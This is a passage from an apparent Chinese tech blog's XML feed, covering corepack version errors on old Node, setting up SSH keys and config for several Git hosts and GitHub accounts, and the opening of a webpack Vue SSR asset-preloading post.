class="line">lrwxrwxrwx 1 root root   51  7月  6 17:08 yarn -&gt; ../../../usr/lib/node_modules/corepack/dist/yarn.js</span><br><span class="line">lrwxrwxrwx 1 root root   54  7月  6 17:08 yarnpkg -&gt; ../../../usr/lib/node_modules/corepack/dist/yarnpkg.js</span><br></pre></td></tr></table></figure><p>这样，yarn/pnpm 的管理权就又重新回到了 corepack 手上，可以愉快的使用 corepack 了。</p><h2 id="3-3-低版本-node-项目中无法使用-corepack"><a href="#3-3-低版本-node-项目中无法使用-corepack" class="headerlink" title="3.3 低版本 node 项目中无法使用 corepack"></a>3.3 低版本 node 项目中无法使用 corepack</h2><p>如果你的某个项目低于 <a href="mailto:node@16.9.0">node@16.9.0</a>，并且这个项目使用了 pnpm 或者 yarn 来作为包管理器管理项目依赖，那么当你安装并启用了 corepack 后你会发现无法使用 pnpm 和 yarn 指令了，会出现如下报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/Cellar/corepack/0.19.0/libexec/lib/node_modules/corepack/dist/lib/corepack.cjs:39787</span><br><span class="line">      process.exitCode ??= code;</span><br><span class="line">                       ^^^</span><br><span class="line"></span><br><span class="line">SyntaxError: Unexpected token &#x27;??=&#x27;</span><br><span class="line">    at wrapSafe (internal/modules/cjs/loader.js:1029:16)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:1078:27)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1143:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:979:32)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:819:12)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:1003:19)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:107:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/usr/local/Cellar/corepack/0.19.0/libexec/lib/node_modules/corepack/dist/pnpm.js:2:1)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:1114:14)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1143:10)</span><br></pre></td></tr></table></figure><p>这是因为 corepack 本身是依赖高版本 node 运行的，当当前系统环境的 node 低于 16.9.0 时，当用户使用 pnpm/yarn 指令会调用 corepack 的 shim，然后执行 corepack 的代码，但是由于当前系统环境的 node 版本低于 corepack 的要求，因此就会出现运行错误。</p><p>解决这个问题最好的方案是将 node 升级，如果是在无法升级，则可以尝试以下方案：</p><ul><li>【最笨的方案，不推荐使用】切回高版本 node，并禁用 corepack，然后回到低版本 node，全局安装 yarn/pnpm（回到高版本 node 前卸载掉全局安装的 yarn/pnpm，然后重新启用 corepack）；</li><li>【推荐网速快的使用】使用 <code>npx yarn</code> 或 <code>npx pnpm</code> 指令（还可以指定版本，比如 <code>npx pnpm@6</code>）来绕过 corepack，这种方案最便捷，但是由于是使用 npx，每次都需要重新下载 pnpm 和 yarn，网速快的话可以无视；</li><li>【配置复杂，但使用比较方便】使用 <code>volta install</code> 安装一个你需要版本的包管理器，比如 <code>volta install pnpm@6</code>，然后你可以在 <code>~/.volta/tools/image/packages/pnpm/bin</code> 目录下找到一个 <code>pnpm</code> 的可执行文件，你可以在你的 <code>.bashrc</code> 或者 <code>.zshrc</code> 使用 alias 创建一个指令别名，如 <code>alias pnpm@volta=&#39;~/.volta/tools/image/packages/pnpm/bin/pnpm&#39;</code>，然后就可以在需要的时候使用 pnpm@volta 来代替执行 pnpm 指令，如果需要切换版本，则重新使用 <code>volta install</code> 安装你需要的版本即可；</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
            <tag> volta </tag>
            
            <tag> node </tag>
            
            <tag> corepack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何配置 SSH 管理多个 Git 仓库和以及多个 Github 账号</title>
      <link href="/2023/06/8c4456586225.html"/>
      <url>/2023/06/8c4456586225.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Why-SSH"><a href="#1-Why-SSH" class="headerlink" title="1. Why SSH ?"></a>1. Why SSH ?</h1><p>在使用 github 时或者免密登录到远程服务器时，总要使用到 SSH 这个工具来创建密钥并进行连接，那什么是 SSH 呢，我们先来看一下它的简单定义：</p><blockquote><p>SSH是一种加密协议，全称为Secure Shell，用于安全地远程登录到服务器或其他远程设备上执行命令或传输文件。它提供了一种安全的加密通信机制，使得远程登录和文件传输等操作不会被恶意攻击者窃取或篡改，确保了数据的保密性和完整性。SSH采用公钥密码学技术，能够有效地防止被中间人攻击或网络窃听。</p></blockquote><p>举例来说，如果我们要使用 Github 这种 git 代码托管平台的话，首先本地要生成一个 SSH <code>私钥(如id_rsa)</code> 和 <code>公钥(如id_rsa.pub)</code>，然后将 <code>公钥</code> 填写到 Github 的 SSH Key 管理面板中。当我们向 Github 推送代码的时候会首先发起身份校验。此时，本地会将用户信息通过 SSH <code>私钥</code> 执行『签名』操作。当签名信息发送到 Github 的时候，Github 就会使用用户保存在平台上的 <code>公钥</code> 来校验签名信息，使用 <code>私钥</code> 签名信息只能由对应的 <code>公钥</code> 进行校验，因此如果 Github 对签名校验通过，就可以认证当前的用户对代码仓库拥有响应的操作权限，之后就可以让用户提交的代码入库了，整体流程如下图：</p><p><img src="https://s2.loli.net/2023/06/19/sIYxpTdMrtmAFHc.png" alt=""></p><blockquote><p>关于公钥和私钥，是『非对称加密』相关的内容，公钥通常用于 <strong>内容加密</strong> 或 <strong>认证签名</strong>，是可以在服务器与客户端之间进行传播的；而私钥是用来 <strong>解密公钥加密的内容</strong> 或 <strong>对内容进行签名</strong> 用的，是<strong>需要严格保管的</strong>。</p></blockquote><p>综上，SSH 采用非对称加密的方式来完成客户端与服务器端的认证并建立通信连接，因此可以被用于客户端与 git 平台之间的认证，以及远程服务器之间的免密认证。</p><h1 id="2-配置单个-Git-账户"><a href="#2-配置单个-Git-账户" class="headerlink" title="2. 配置单个 Git 账户"></a>2. 配置单个 Git 账户</h1><p>首先，我们来简单复习一下如何配置单个 git 账户。</p><p>对于单个 git 账户的场景非常简单，假如我们是一个萌新开发者，想要往 Github 上上传项目（这里我们仅探讨 SSH 协议的方式），那么首先我们要在本地安装 OpenSSH 以及 git。</p><blockquote><p>一般 Linux 类操作系统、MacOS 都已经自带了 ssh 和 git，不需要单独安装。windows 操作系统参考 <a href="https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=gui">官方说明</a> 来开启 OpenSSH，git 则可以直接访问 <a href="https://git-scm.com/">官网</a> 进行安装</p></blockquote><p>安装完 git 之后打开终端，我们先要使用 <code>git</code> 指令为全局设置一个 git 账户和邮箱：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email YourEmailAdress</span><br><span class="line">git config --global user.name YourUserName</span><br></pre></td></tr></table></figure><blockquote><p>这里 git 的用户名和密码跟你的 Github 账号没有强关联，Github 的账号只是你登录平台用的，而这里的 git 用户名和邮箱是用来标记代码是哪个用户写的。</p></blockquote><p>安装完 OpenSSH 之后打开操作系统上的终端（windows 操作系统推荐使用 git bash 或者 cmder），然后来到 ssh 目录下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.ssh</span><br></pre></td></tr></table></figure><p>如果首次安装，这个目录里面会没有任何内容，之后我们执行第一步：<strong>生成一对 SSH 密钥</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;YourEmailAdress&quot;</span></span><br></pre></td></tr></table></figure><p>这个指令的意思是使用 <code>ssh-keygen</code> 生成密钥，<code>-t</code> 参数密钥的加密方式是 <code>rsa</code>，<code>-C</code> 参数可以为密钥指定备注，通常备注可以为你的邮箱，或者你也可以写成你要连接的远程服务器名（总之不重要）。</p><p>输入完成之后会进入一个交互式终端界面，首先会询问你的密钥文件名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter file in which to save the key (/Users/username/.ssh/id_rsa):</span><br></pre></td></tr></table></figure><p>我们可以使用回车跳过，那么密钥文件名称就自动生成为 <code>id_加密方式</code>，如 <code>id_rsa</code>。</p><p>之后会提示用户输入密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter passphrase (empty for no passphrase):</span><br></pre></td></tr></table></figure><p>这个密码是用来保护你的私钥的，我们这里避免麻烦可以直接跳过。</p><p>生成完成之后，我们在终端中使用 cat 指令，输出生成的公钥内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure><blockquote><p>公钥的内容为一串长字符串，字符串的末尾为你输入的密钥备注</p></blockquote><p>之后我们访问 Github 的用户设置界面，并来到 <code>SSH and GPG keys</code> 面板</p><p><img src="https://s2.loli.net/2023/06/19/tkALBmQeihN62c1.png" alt=""></p><p>点击 <code>New SSH key</code> ，之后将前面输出的公钥内容粘贴到 输入框中：</p><p><img src="https://s2.loli.net/2023/06/19/BFMw14a7KOqcdzZ.png" alt=""></p><p>之后我们输入 <code>ssh -T git@github.com</code> 如果提示 <code>You&#39;ve successfully authenticated</code> 就说明成功与 Github 建立了授权链接，你就可以往你的 Github 仓库推送代码了。</p><h1 id="3-配置多个-Git-代码托管平台"><a href="#3-配置多个-Git-代码托管平台" class="headerlink" title="3. 配置多个 Git 代码托管平台"></a>3. 配置多个 Git 代码托管平台</h1><p>作为一个程序员，在工作中，我们可能需要将代码推送到公司的自建 Git 代码托管平台上（如 GithLab）。然而在生活中，当我们参与一些个人的开源项目，则又需要将代码推送到社区的 Git 代码托管平台上（如 Github 或 Gieet）。</p><blockquote><p>emmm 有点像 Marvel 的超级英雄？</p></blockquote><p>为了应对这个场景，我们通常有两种解决方案：</p><h3 id="3-1-方案一：多个-Git-代码托管平台配置同一个-SSH-公钥"><a href="#3-1-方案一：多个-Git-代码托管平台配置同一个-SSH-公钥" class="headerlink" title="3.1 方案一：多个 Git 代码托管平台配置同一个 SSH 公钥"></a>3.1 方案一：多个 Git 代码托管平台配置同一个 SSH 公钥</h3><p>在第一节我们已经简单了解了 SSH 公钥的作用，那么我们可以简单推断出在使用 SSH 创建身份验证连接的时候，<strong>并没有严格限定我们生成的私钥和公钥只能应用于一个 Git 代码托管平台</strong>。</p><p>那么我们只要创建出了一对公私钥，复制公钥内容到多个平台的 SSH Key 管理面板中即可完成对一对公私钥的复用。</p><p>当我们创建 SSH 连接的时候，git 会使用默认且唯一的一个私钥来对身份信息进行签名，当推送到不通的平台时，因为使用的是同一个公钥，因此可以正常通过身份认证。</p><h3 id="3-2-方案二：使用多组密钥并指定给不同的平台"><a href="#3-2-方案二：使用多组密钥并指定给不同的平台" class="headerlink" title="3.2 方案二：使用多组密钥并指定给不同的平台"></a>3.2 方案二：使用多组密钥并指定给不同的平台</h3><p>SSH 允许统一个操作系统中存在多对密钥，因此你可以使用 <code>ssh-keygen</code> 指令生成多组密钥，同时将不同的密钥分配给不通的 Git 代码托管平台。</p><h4 id="Setp-1-生成密钥"><a href="#Setp-1-生成密钥" class="headerlink" title="Setp.1 生成密钥"></a>Setp.1 生成密钥</h4><p>首先，我们使用 <code>ssh-keygen</code> 生成第一组密钥对，用于提供给 Gtihub 平台使用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;YourPersonalEmailAdress&quot;</span></span><br><span class="line"><span class="comment"># 输入密钥的名称: id_rsa_github</span></span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/Users/username/.ssh/id_rsa): id_rsa_github</span><br></pre></td></tr></table></figure><p>然后，我们再生成第二组密钥对，用于提供给公司的 Git 代码托管平台（如 Gitlab）使用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;YourCompanyEmailAdress&quot;</span></span><br><span class="line"><span class="comment"># 输入密钥的名称: id_rsa_company</span></span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/Users/username/.ssh/id_rsa): id_rsa_company</span><br></pre></td></tr></table></figure><p>此时，你的 <code>~/.ssh</code> 目录下会出现四个文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id_rsa_github</span><br><span class="line">id_rsa_github.pub</span><br><span class="line">id_rsa_company</span><br><span class="line">id_rsa_company.pub</span><br></pre></td></tr></table></figure><p>然后我们要把生成的密钥使用 <code>ssh-add</code> 指令添加到 ssh-agent 的身份验证代理中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-add id_rsa_github</span><br><span class="line">ssh-add id_rsa_company</span><br></pre></td></tr></table></figure><blockquote><p>如果不实用 <code>ssh-add</code> 指令添加新的密钥到 ssh agent 中的话，系统会仍然使用 <code>id_rsa</code> 作为默认的 SSH Key，因为 <code>id_rsa</code> 是被默认添加到 ssh agent 中的</p></blockquote><h4 id="Step-2-为远程服务器配置密钥"><a href="#Step-2-为远程服务器配置密钥" class="headerlink" title="Step.2 为远程服务器配置密钥"></a>Step.2 为远程服务器配置密钥</h4><p><code>~/.ssh</code> 目录下存在一个 <code>config</code> 文件，如果不存在可以使用 <code>touch config</code> 指令这个文件。</p><p>这个文件用于配置 SSH 客户端的信息，例如主机名、端口号、用户名、密钥等，对于 Git 代码托管平台来说，我们可以通过这个配置为不通的 Git 代码托管平台服务器配置不同的 SSH 密钥。</p><p>继续上面的示例，创建 config 文件后，使用 vim 或者其他任意编辑器编辑 config 文件，输入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_github</span><br><span class="line"># 使用 socks 代理</span><br><span class="line"># ProxyCommand nc -X 5 -x 127.0.0.1:7890 %h %p</span><br><span class="line"></span><br><span class="line">Host company-git-repo.com</span><br><span class="line">User git</span><br><span class="line"># 替换为你公司的 Git 代码托管平台的服务器</span><br><span class="line">Hostname company-git-repo.com</span><br><span class="line"># 你公司 SSH 服务的端口号</span><br><span class="line">Port 22</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_company</span><br></pre></td></tr></table></figure><p>config 配置文件中的各项配置意思为：</p><ul><li>Host：用户在命令中使用的主机名称（或模式），可以是简化的别名（比如连接到 github.com 可以填写为 <code>github.com</code> 也可以填写为 <code>github</code>），也可以是支持通配符的模式；</li><li>User：指定使用的用户名，通常为 git，也可以不指定；</li><li>Hostname：指定连接到的主机的实际域名或IP地址。如果是向 Github 推送代码，则为 github.com，如果是向公司的 Git 代码托管平台推送代码，则填写公司主机的地址</li><li>Port：SSH 服务的端口号，默认为 22，可以不写</li><li>PreferredAuthentications：指定优先使用的身份验证方法，指定为publickey，即使用公钥进行身份认证。</li><li>IdentityFile：指定要使用的私钥文件路径，即指向你创建的私钥，我们这里分别为不通的 Git 代码托管平台指定了不同的私钥</li></ul><blockquote><p>2025.01.17 补充：Host 建议填写完整，经过测试如果连接目标是 <code>github.com</code> 但是只填写 <code>github</code> 时，<code>ProxyCommand</code>  配置会无法生效。</p></blockquote><p>配置完成后，我们登录 Github，将 <code>id_rsa_github.pub</code> 的公钥内容复制到 SSH Key 管理面板中；同样的，我们登录公司的 Git 代码托管平台上，将 <code>id_rsa_company.pub</code> 中的公钥内容复制到对应的管理 SSH Key 的位置（这个位置通常在个人信息设置中，可能被称为 『SSH Key 管理』或者『公钥管理』等名称）</p><p>这样，当将代码上传到 Github 时，就会自动使用 <code>id_rsa_github</code> 这个密钥对；当将代码上传到公司的 Git 代码托管平台时候，就会自动使用 <code>id_rsa_company</code> 这个密钥对。</p><h4 id="Setp-3-配置不同的-git-用户名以及邮箱"><a href="#Setp-3-配置不同的-git-用户名以及邮箱" class="headerlink" title="Setp.3 配置不同的 git 用户名以及邮箱"></a>Setp.3 配置不同的 git 用户名以及邮箱</h4><p>除了解决了不同平台使用不通的公私钥问题外，我们在不通的仓库提交代码时用的用户名和邮箱也可能需要不一样，比如：</p><ul><li>在 Github 上，我需要用网名来隐藏我的真实身份，因此我提交代码的用户名为 <code>github-user</code>，邮箱为 <code>github-user@github.com</code>；</li><li>而在工作中，公司则要求我提交代码时的 git 用户名必须为我的真实姓名拼音，邮箱则为公司邮箱。</li></ul><p>这些配置就跟 SSH 的配置无关了，这些就需要调整我们的 git 配置。</p><p>首先，我们在全局配置一个 git 用户名和邮箱，这里我建议使用你在 Github 上想要使用的用户名和邮箱，毕竟 Github 常驻，而公司不常驻：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email github-user@github.com[更改成你的邮箱]</span><br><span class="line">git config --global user.name github-user[更改成你的网名]</span><br></pre></td></tr></table></figure><p>此时，我们在 git 的配置文件 <code>~/.gitconfig</code> 中就可以看到如下的配置段，表示已经配置成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[user]</span><br><span class="line">name = github-user</span><br><span class="line">email = github-user@github.com</span><br></pre></td></tr></table></figure><p>当我们提交代码的时候就会使用这个默认的用户名和邮箱来提交代码了。</p><p>除此之外，git 也支持通过在 git 项目内添加一个『本地配置』来单独配置每个项目的用户名和密码。利用这个能力，当我们将公司的代码 clone 到本地之后，进入到代码仓库，<strong>首先要做的第一件事情就是为这个公司的代码仓库设置独立的 git 用户名和密码</strong>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> user.name zhangsan[改为你的真实姓名]</span><br><span class="line">git config --<span class="built_in">local</span> user.name zhangsan@company.com[改为你公司的邮箱]</span><br></pre></td></tr></table></figure><p>总结，我们在使用 Github 提交提交代码的时候，无需在项目内单独设置 git 用户名和邮箱，因为会自动使用我们全局设置好的；当我们在编写公司项目的时候，当代码拉下来之后要单独为这个项目设置一个用户名和邮箱。</p><h1 id="4-同时配置多个-Github-账号"><a href="#4-同时配置多个-Github-账号" class="headerlink" title="4. 同时配置多个 Github 账号"></a>4. 同时配置多个 Github 账号</h1><p>区别与配置多个多个 Git 代码托管平台，还有一种情况我们是可能遇到的。假如你是一个 Github 上的开发者，你的电脑上配置好了一个提供给 Github 提交代码使用的密钥对，但是同时你又需要管理一个小号<del>（比如管理一个你女朋友的账号给她的代码仓库提交代码）</del>。</p><p>聪明的你一定会想到，我再我的小号中添加我现在已经创建好的专门给 Github 使用的公钥不就可以了吗？想法很不错，是第二节中我们提到的方案一的思路，但是 Github 不允许在多个账户上使用同一个 SSH Key，当你设置了就会出现『Key is already in use』的提示。</p><p>那先让我们仿照 3.2 节中描述的方法如法炮制一下，再生成一个新的 SSH Key，名字就叫做 <code>id_rsa_github_x</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;YourPersonalEmailAdress&quot;</span></span><br><span class="line"><span class="comment"># 输入密钥的名称: id_rsa_company</span></span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/Users/username/.ssh/id_rsa): id_rsa_github_x</span><br></pre></td></tr></table></figure><p>我们把小号的公钥添加到 Github 的 SSH Key 面板中后，在 SSH config 文件中追加上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># github 主账号的配置</span><br><span class="line">Host github</span><br><span class="line">    User git</span><br><span class="line">    Hostname github.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_github</span><br><span class="line">    </span><br><span class="line"># github 新账号的配置</span><br><span class="line">Host github_x</span><br><span class="line">    User git</span><br><span class="line">    Hostname github.com</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_github_x</span><br></pre></td></tr></table></figure><p>这个时候，你从小号的 Github 中 clone 下来一个仓库，假设地址为 <code>git@github.com:user_x/blog.git</code>，那么就在终端中输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:user_x/blog.git</span><br></pre></td></tr></table></figure><p>然后 commit 一些代码后，执行 push 操作时，就会发现出错啦：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Permission to user_x/blog.git denied to xxx.</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br></pre></td></tr></table></figure><p>这个意思就是说明你没有权限向这个仓库中提交代码，也就是说 SSH 授权出问题了。</p><p>实际上，在你使用 <code>git push</code> 提交代码的时候，由于你的代码的仓库源在 Github 上，因此 SSH 连接的主机就是 <code>github.com</code>，然而当 SSH 发起连接的时候，它会发现你的 SSH config 文件中配置了两段 <code>Hostname</code> 都为 <code>github.com</code> 的配置，那么 SSH 会优先使用第一段配置中的公钥向 Github 建立身份认证连接。那么当身份认证请求到达 Github 的时候，Github 拿出公钥进行身份认证签名对比后发现你不是你的小号，那么自然就会拒绝你的提交代码的请求。</p><p>那么，如何让发起请求的时候，使用我们小号的私钥呢？我们先来看一下执行 clone 代码时候，仓库源那个以 <code>git</code> 开头的链接是什么意思：</p><p><img src="https://s2.loli.net/2023/06/21/ODlc8M1eKrb9agP.png" alt=""></p><p>清楚了以上各个部分代表的意思后，我们可以利用 SSH 建立连接的一个特性：目标服务器可以直接写成为服务器地址，同时也可以写为我们在 SSH config 文件中配置的 <code>Host</code>，也就是服务器的别名。</p><p>因此我们可以将仓库的源改为 <code>git@github_x:user_x/blog.git</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin git@github_x:user_x/blog.git</span><br></pre></td></tr></table></figure><p>此外别忘了我们必须使用 <code>ssh-add</code> 指令将生成的 SSH key 添加到 ssh-agent 的身份验证代理中：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add ~/.ssh/id_rsa_github_x</span><br></pre></td></tr></table></figure><blockquote><p>否则建立 SSH 连接时，会使用 id_rsa_github 的密钥对，你始终无法得到正确的身份识别！</p></blockquote><p>然后我们来测试一下连接：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github_x</span><br><span class="line"><span class="comment"># 输出如下内容就说明身份认证通过了！</span></span><br><span class="line">Hi user_x[你小号的用户名]! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><p>如果输出的用户名是你的小号，那就说明可以正常在刚才的那个仓库里推送代码了。</p><p>再来测试一下主账号的连接是否正常：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment"># 输出如下内容就说明身份认证通过了！</span></span><br><span class="line">Hi user[你主账号的用户名]! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><p>如果输出的用户名是你的主账号用户名，就说明原有的 Github 连接并没有受到影响，之前的仓库依旧可以正常推送代码。</p><blockquote><p><code>You&#39;ve successfully authenticated, but GitHub does not provide shell access.</code> 这个警告无需理会，只是在提醒你 github 不允许 shell 交互（比如像使用 ssh 连接一台远程主机那样）而已。</p></blockquote><p>此后，clone 小号的代码仓库时候也要记得将远程源的『目标服务器』字段改写为你在 ssh config 中编写的 Host 别名，这样才不会与你 Github 主账号的连接冲突。主账号则仍然使用 <code>github.com</code> 作为目标服务器地址即可。</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> Github </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于 Webpack 的 Vue 服务端渲染项目提前加载当前页面所需资源</title>
      <link href="/2023/06/237cbfa282cc.html"/>
      <url>/2023/06/237cbfa282cc.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们使用 Webpack 搭建一个基于 Vue 的服务端渲染项目时，通常会遇到一个很麻烦的问题，即我们无法提前获取到当前页面所需的资源，从而不能提前加载当前页面所需的 CSS，导致客户端在获取到服务端渲染的 HTML 时，得到的只有 HTML 文本而没有 CSS 样式，之后需要等待一会儿才能将 CSS 加载出来，也就是会遇到『样式闪烁』这样的问题。</p><h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>这是由于 webpack 应用的代码加载机制导致的。 在大型应用中，webpack 不可能将项目只打包为单独的一个 js、css 文件，而是会利用 webpack 的 <a href="https://webpack.docschina.org/guides/code-splitting/">代码分割</a> 机制，将庞大的代码按照一定的规则（比如超过一定的大小、或者被多次引用）进行拆分，这样代码的产出就会成为如下的样子：</p><blockquote><p>注：<code>xxx</code> 指的是每次打包生成的文件哈希，用于更新浏览器的本地缓存，更多详情参考 <a href="https://webpack.docschina.org/guides/caching/">官方文档</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 入口文件</span><br><span class="line">main.xxx.js</span><br><span class="line">main.xxx.css</span><br><span class="line"></span><br><span class="line">// runtime 文件，后续重点介绍</span><br><span class="line">runtimechunk~main.xxx.js</span><br><span class="line"></span><br><span class="line">// 使用了异步加载方式引入而被拆分的包，如 vue-router 的路由懒加载</span><br><span class="line">layout.xxx.js</span><br><span class="line">layout.xxx.css</span><br><span class="line">home-page.xxx.js</span><br><span class="line">home-page.xxx.css</span><br><span class="line">user-page.xxx.js</span><br><span class="line">user-page.xxx.css</span><br><span class="line"></span><br><span class="line">// 被拆分的子包（如果被拆分的子包中没有 css 文件的引入，那么就不会生成 css 子包）</span><br><span class="line">73e8df2.xxx.js</span><br><span class="line">73e8df2.xxx.css</span><br><span class="line">980e123.xxx.js</span><br></pre></td></tr></table></figure><p>如上，如果没有进行特殊的 webpack 分包配置，一般就会生成如上四种类型的包，并且如果使用了 <code>css-minimizer-webpack-plugin</code> 的话（PS：这个包是必须的），还会为每个引用了 css 的子包再单独生成一个对应的 css 文件。这四种类型的包在整体上还可以被具体划分为两类：</p><ul><li>具名子包（namedChunk）</li><li>随机命名子包</li></ul><p><code>main.xxx.js</code> 这种入口文件，以及 <code>home-page.xxx.js</code> 这样异步引入同时并使用 <a href="https://webpack.docschina.org/api/module-methods/#magic-comments">Comments</a> 进行命名的包，被称为『具名子包』；而类似 <code>73e8df2.xxx.js</code> 